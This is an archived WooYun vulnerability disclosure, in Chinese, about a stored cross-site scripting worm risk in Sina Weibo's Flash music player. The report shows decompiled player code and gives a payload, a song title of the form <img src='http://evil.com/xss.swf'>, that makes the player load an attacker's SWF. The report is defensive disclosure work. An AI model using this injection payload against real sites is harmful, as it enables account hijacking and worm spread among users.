@@ -1,0 +1,250 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		Flash应用安全系列[6]--新浪微博蠕虫威胁  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		Flash应用安全系列[6]--新浪微博蠕虫威胁  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/p.z">p.z</a> 
+</li><li>提交时间：		2013-01-22 22:19</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2013-01-22：	细节已通知厂商并且等待厂商处理中<br/>
+									2013-01-22：	厂商已经确认，细节仅向厂商公开<br/>
+									2013-02-01：	细节向核心白帽子及相关领域专家公开<br/>
+									2013-02-11：	细节向普通白帽子公开<br/>
+									2013-02-21：	细节向实习白帽子公开<br/>
+									2013-03-08：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">新浪微博在渲染微博内容时，可能导致存储型跨站攻击。</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail">我们首先看下之前的几个新浪微博与Flash相关的存储型跨站<br />
+<br />
+ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2011-01768">WooYun: sina微薄存储型跨站</a> <br />
+<br />
+ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2011-01904">WooYun: sina微博存储型跨站Ⅱ</a> <br />
+<br />
+ <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2011-03574">WooYun: sina微博存储型跨站Ⅲ</a> <br />
+<br />
+<br />
+<br />
+上面的几个案例的基本思路就是利用allowscriptaccess=always这一条件，使flash加载我们自己的swf文件，达到跨站的目的，上面几个case现在已经修补了，但是否就再也没有相似的案例了呢？<br />
+<br />
+<br />
+<br />
+与前几个关注视频播放不同，这回我们将目光投向了音频播放，在用windows系统浏览新浪微博时，音频还是通过swf来进行播放的。我们发现，在播放新浪音乐库、songtaste歌曲时，swf播放器的allowscriptaccess还是always。由于用户可以向songtaste提交歌曲，因此我们选择播放songtaste的歌曲做测试<br />
+<br />
+<br />
+<br />
+现在我们需要思考一个问题，如何使那个音乐播放的swf文件再载入一个我们指定地址的swf文件。因为这是一个音频播放器，通常并不需要像视频播放器一样载入一个skin.swf或者一个thumbnail，而且在这个case里，我们可以控制的变量少之又少，只有歌曲名字、歌手名字等几个文本类的信息，是否可以通过这里做点文章呢。<br />
+<br />
+<br />
+<br />
+我们先看看这些文本类的信息是怎么输出的。反编译swf文件（music.sina.com.cn/yueku/js/mwp/feedPlayer.swf?vers=3），关键的代码逻辑如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>var _loc_3:* = this.view.loaderInfo.parameters;<br />
+...<br />
+GlobalParam.conf.song = StringUtils.trim(_loc_3.song || &quot;&quot;);<br />
+...<br />
+var _loc_4:* = new SoundBaseVO();<br />
+...<br />
+_loc_4.songName = GlobalParam.conf.song || &quot;&quot;;<br />
+...<br />
+        private function setFirstSong(param1:SoundBaseVO) : void<br />
+        {<br />
+            ...<br />
+            if (param1.outLink)<br />
+            {<br />
+                _loc_2 = &quot;&lt;b&gt;&lt;a href=\&#039;http://t.cn/&quot; + GlobalParam.conf.shorturl + &quot;\&#039; target=\&#039;_blank\&#039;&gt;&quot; + param1.songName + &quot;&lt;/a&gt;&lt;/b&gt;&quot;;<br />
+                this.txt_songName.htmlText = _loc_2;<br />
+                this.txt_artistName.text = StringDot.getTextLimit(param1.artistName, 13);<br />
+            }</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+我们看到，从loaderInfo对象传入的song值最后在一个名为txt_songName的文本框，以htmlText的方式输出了。不要以为这里的htmlText就等同于HTML文本语言了。Adobe的帮助手册上写的很明确，Flash Player支持部分标准 HTML 标签，包括如下：<br />
+<br />
+<br />
+<br />
+</p><pre><code>锚标签 <br />
+粗体标签 <br />
+换行标签 <br />
+字体标签 <br />
+图像标签 <br />
+斜体标签 <br />
+列表项标签 <br />
+段落标签 <br />
+Span 标签 <br />
+文本格式标签 <br />
+下划线标签</code></pre><p class='detail'> <br />
+<br />
+<br />
+<br />
+值得一提的是其中的图像标签，adobe的帮助手册是这么说的<br />
+<br />
+<br />
+<br />
+&lt;img&gt; 标签允许您将外部图像文件（JPEG、GIF、PNG）、SWF 文件和影片剪辑嵌入到文本字段中和 TextArea 组件实例中。<br />
+<br />
+<br />
+<br />
+也就是说，我们可以通过&lt;img src=&quot;http://evil.com/xss.swf &quot;&gt;的形式嵌入一个swf文件。Cool？<br />
+<br />
+<br />
+<br />
+现在我们要做的，就是去songtaste.com提交一个名字为 &lt;img src=&quot;http://evil.com/xss.swf &quot;&gt; 歌曲，然后在发微博处引用这个songtaste链接，等着别人点击播放这个音乐文件。<br />
+<br />
+<br />
+<br />
+ </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail"><br />
+<br />
+Songtaste: http://www.songtaste.com/song/3235631/<br />
+<br />
+<br />
+<br />
+</p><p class="detail"><a href="../images/22220321fc80cfaea7ae70d5aaa29811fd9ef078.jpg" target="_blank"><img src="../images/22220321fc80cfaea7ae70d5aaa29811fd9ef078.jpg" alt=".jpg" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail"> </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/p.z" title="p.z">p.z</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-017699" title="Flash应用安全系列[6]--新浪微博蠕虫威胁">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：15 </p>
+													<p class="detail">确认时间：2013-01-22 23:51</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">感谢关注新浪安全。</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="17699";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
